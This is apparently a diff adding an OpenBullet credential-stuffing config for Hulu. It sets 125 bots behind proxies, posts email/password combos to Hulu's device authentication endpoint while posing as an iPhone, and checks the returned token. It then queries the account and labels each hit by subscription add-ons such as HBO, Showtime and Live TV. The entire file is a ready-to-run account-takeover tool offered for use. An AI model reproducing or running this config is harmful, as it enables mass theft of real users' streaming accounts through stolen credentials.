@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "Hulu",
+  "SuggestedBots": 125,
+  "LastModified": "2019-04-05T19:35:24.5426639-05:00",
+  "AdditionalInfo": "",
+  "Author": "NestleNutella",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" 
+  CONTENT "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=<PASS>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid" 
+PARSE "<SOURCE>" LR "user_token\":\"" "\"" -> VAR "Token" 
+REQUEST GET "https://home.hulu.com/v1/users/self" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "subscription\":{\"id" 
+  KEYCHAIN Failure OR 
+    KEY "status\":null,\"subscriber_id" 
+    KEY "\"status\":\"6\",\"subscriber_id\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "package_ids\":[],\"" 
+    KEY "package_ids\":[\"1\",\"2\"],\"" 
+PARSE "<SOURCE>" LR "package_ids\":[\"1\",\"2\"," "]" -> VAR "sub" 
+FUNCTION Replace "\"14\"" "No Commercials" "<sub>" -> VAR "sub" 
+FUNCTION Replace "\"16\"" "Live TV" "<sub>" -> VAR "sub" 
+FUNCTION Replace "\"15\"" "Showtime" "<sub>" -> VAR "sub" 
+FUNCTION Replace "\"17\"" "HBO" "<sub>" -> VAR "sub" 
+FUNCTION Replace "\"18\"" "Cinemax" "<sub>" -> VAR "sub" 
+FUNCTION Replace "\"19\"" "STARZ" "<sub>" -> VAR "sub" 
+PARSE "<sub>" JSON "" -> CAP "Subscribed To" 
